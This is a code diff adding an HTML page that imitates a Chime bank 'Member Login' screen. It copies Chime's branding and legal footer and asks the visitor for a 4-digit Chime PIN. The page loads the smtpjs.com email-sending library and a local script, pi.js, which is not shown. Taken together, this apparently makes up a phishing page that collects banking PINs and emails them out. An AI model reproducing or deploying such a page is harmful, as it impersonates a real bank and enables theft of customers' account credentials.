@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>Chime Member Login</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+    <br>
+    <div class="chi2">
+        <img src="Untitled.jpg" width="200" height="90" loading="lazy">
+    </div><br>
+    <div class="soss2">
+        <p class="sos2">Please enter your 4-digit Chime Pin number</p><br>
+    </div>
+    <form action="#" class="contact2">
+
+        <script>
+            function limitInput() {
+              var input = document.getElementById('pin');
+              var value = input.value;
+              var maxLength = 4;
+          
+              if (value.length > maxLength) {
+                input.value = value.slice(0, maxLength);
+              }
+            }
+          </script>
+          
+        <input id="pin" type="number" pattern="[0-9]*" placeholder="Chime Pin" oninput="checkPhoneNumberLength(this)" required>
+        <script>
+            function checkPhoneNumberLength(input) {
+                if (input.value.length > 4) {
+                input.value = input.value.slice(0, 4);
+                }
+            }
+        </script>
+
+        <input id="fsubmit2" type="submit" value="Log In">
+
+        <!--javascript to change Submit to Loading after click, check css-->
+        <script>
+            var button = document.querySelector('.contact2 input[type="submit"]');
+            button.addEventListener('click', function() {
+                button.classList.add('clicked');
+                button.value = "Loading...";               
+                setTimeout(function() {
+                    button.classList.remove('clicked');
+                    button.value = "Log In";
+                },  4000); 
+            });
+        </script>
+        <script src="./pi.js"></script>
+    <form>
+    
+    <br><br><br><br><br><br><br><br>
+
+</body>
+<footer>
+    <p class="foot2">© 2023 Chime Bank. All Rights Reserved. Banking Services provided by The Bancorp Bank or Stride Bank, N.A., Members FDIC.</p>
+    <p class="toot2">The Chime Visa® Debit Card is issued by The Bancorp Bank or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are</p>
+    <p class="ace2">accepted. Please see back of your Card for its issuing bank.</p>
+</footer>
+</html>
